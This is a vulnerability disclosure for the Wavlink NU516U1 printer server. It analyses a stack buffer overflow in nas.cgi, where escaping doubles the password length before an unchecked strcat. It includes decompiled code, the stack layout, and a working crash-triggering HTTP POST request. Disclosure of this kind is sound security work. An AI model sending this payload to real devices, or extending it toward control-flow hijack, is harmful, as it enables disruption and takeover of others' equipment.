# Wavlink NU516U1 (V251208) nas.cgi Component sub_401218 Function Stack Buffer Overflow via "User1Passwd" Parameter

### Overview

- **Vendor**: Wavlink
- **Product**: NU516U1
- **Version**: WAVLINK-NU516U1-A-WO-20251208-BYFM
- **Type**: Stack Buffer Overflow
- **Product Use**: USB Printer Server
- **Firmware Download**: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=all
- **Default Password**: admin

### Vulnerability Information

- **Vulnerable Function**: `sub_401218` (NAS settings processing) and its helper function `sub_4051B0` (character escaping)
- **Vulnerability Point**: `strcat(a2, v7)` within function `sub_4051B0`
- **Trigger Parameter**: `User1Passwd` (corresponds to `v5` -> `v11` in code)
- **Prerequisites**:
  - Attacker must possess a valid login Session (Cookie).
  - Request parameter `enable_storage_management` must be set to `1` to enter the vulnerable code branch.

### Vulnerability Description

While processing NAS (Storage Management) configuration requests, the `sub_401218` function retrieves the `User1Passwd` parameter submitted by the user. This parameter is subsequently passed to the helper function `sub_4051B0` for escaping, intended to store the result in a fixed-size stack buffer `v11` (128 bytes in size).

The root cause of this vulnerability is identical to the previously discovered OTA upgrade vulnerability: the helper function `sub_4051B0` forcibly prepends a backslash `\` to every character during string processing (e.g., `A` becomes `\A`), causing the data length to **expand by a factor of 2**. Because `strcat` appends the expanded data to the target buffer `v11` without any boundary checks, an attacker providing a password exceeding 64 bytes can easily overflow the 128-byte stack space. The overflow data overwrites local variables and the return address (`$ra`) on the stack, allowing for a hijack of the execution flow to an attacker-controlled address upon function return.

### Memory Layout and Root Cause Analysis

<img width="1876" height="1107" alt="image" src="https://github.com/user-attachments/assets/0ad1123a-e989-44dd-9710-4beb83e8ffd3" />


Based on the decompiled code, the memory logic flow is as follows:

- **Stack Layout (`sub_401218`)**:
  - `v11` (Target Buffer): Located at `$sp + 0x20`, size 128 bytes.
  - Immediately followed by saved registers and the function return address.
- **Expansion Effect**:
  - Input: `AAAA` (4 bytes)
  - Written: `\A\A\A\A` (8 bytes)
- **Overwriting Path**:
  - When the length of `User1Passwd` reaches approximately 120 bytes, the expanded data volume becomes 240 bytes.
  - This significantly exceeds the 128-byte limit of `v11`, and the additional 112 bytes precisely overwrite the saved register values in the stack frame.

### Vulnerability Code Snippet (Logic Reconstruction)

<img width="1843" height="898" alt="image" src="https://github.com/user-attachments/assets/b3169ca6-d1c2-482d-b91b-187d29110816" />


```
// Helper function: The "Amplifier" causing length doubling
int __fastcall sub_4051B0(int a1, const char *a2) // a1: user password, a2: stack buffer v11
{
  for ( i = 0; i < strlen(a1); ++i )
  {
    sprintf(v7, "\\%c", *(char *)(a1 + i)); // Expansion point: length becomes 2x
    strcat(a2, v7); // 💥 Vulnerability: Append without boundary check
  }
  return 0;
}

// Main function: NAS Settings
int __fastcall sub_401218(int a1)
{
  char v11[128]; // [sp+20h] Fixed stack buffer, only 128 bytes
  // ...
  v3 = sub_403808("User1Passwd", a1, 0);
  v5 = strdup(v3); 
  // ...
  if ( n49 == 49 ) // enable_storage_management == 1
  {
    sub_4051B0(v5, v11); // Trigger overflow
  }
  // ...
}
```

### Memory Threshold Verification (PoC Testing)

Comparison of `Content-Length` and HTTP response codes during actual testing:

- **Safe Payload**:
  - Moderate `User1Passwd` length.
  - **Result**: HTTP 200 OK.
  - **Analysis**: Although a partial overflow occurred, it did not destroy critical execution flow control data. The service restarted normally due to the subsequent `kill` logic.

<img width="1832" height="826" alt="image" src="https://github.com/user-attachments/assets/7eaa5820-0893-46ef-bd1b-546635f6604a" />


- **Overflow Payload (Triggering Crash)**:
  - `User1Passwd` length increased by just **1 byte**.
  - **Result**: **HTTP 500 Internal Server Error**.
  - **Analysis**: The extra character, after expansion, precisely overwrote a critical pointer or the return address on the stack. This caused the program to trigger a Segmentation Fault before executing `free()` or returning, resulting in the web server returning a 500 error due to the CGI abnormal exit.

<img width="1958" height="818" alt="image" src="https://github.com/user-attachments/assets/7a2055e2-c669-4d3e-97fa-5b7cb540ee50" />


### PoC Packet (Validating Payload)

Send the following packet to reproduce the crash (requires a valid session cookie):

```
POST /cgi-bin/nas.cgi HTTP/1.1
Host: usblogin.link
Content-Length: 270
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usblogin.link
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usblogin.link/html/APModel.shtml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=2108182005
Connection: close

page=nas&enable_storage_management=1&User1Passwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

*(Note: Ensure the Payload length is sufficient so that the expanded string far exceeds 128 bytes; the payload above is enough to trigger a 500 error.)*
